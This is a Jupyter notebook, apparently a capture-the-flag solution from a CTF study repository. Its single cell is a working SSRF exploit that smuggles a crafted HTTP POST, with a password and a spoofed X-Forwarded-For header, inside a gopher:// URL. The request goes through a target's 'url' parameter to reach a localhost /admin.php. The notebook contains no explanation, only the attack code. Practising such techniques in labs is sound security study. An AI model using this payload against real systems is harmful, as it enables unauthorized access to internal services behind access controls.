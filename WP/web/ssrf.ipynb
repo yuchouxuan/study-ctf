{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from urllib.parse import quote\n",
    "data = \"passw0rd=This_eAsy_passwOrd\"\n",
    "package = \"\"\"POST /admin.php HTTP/1.1\n",
    "Host: 127.0.0.1\n",
    "Cache-Control: max-age=0\n",
    "Upgrade-Insecure-Requests: 1\n",
    "User-Agent: Chrome/92.0.4515.107 Safari/537.36\n",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\n",
    "Accept-Language: zh-CN,zh;q=0.9\n",
    "Connection: close\n",
    "Content-Type: application/x-www-form-urlencoded\n",
    "X-Forwarded-For: authorized.local\n",
    "Content-Length: {}\n",
    "\n",
    "\"\"\".format(len(data))+data\n",
    "\n",
    "package=quote(package).replace('%0A','%0D%0A')\n",
    "\n",
    "url = \"http://10.101.0.8/?url=gopher://127.0.0.1:80/_\"+quote(package) # 作为url参数使用需要再加一层url编码\n",
    "\n",
    "import requests \n",
    "print(url)\n",
    "requests.get(url).text"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "3bd13bc16400e16874b7ce28af58a129343287e94248a182c1f06fbb6b76ef8e"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
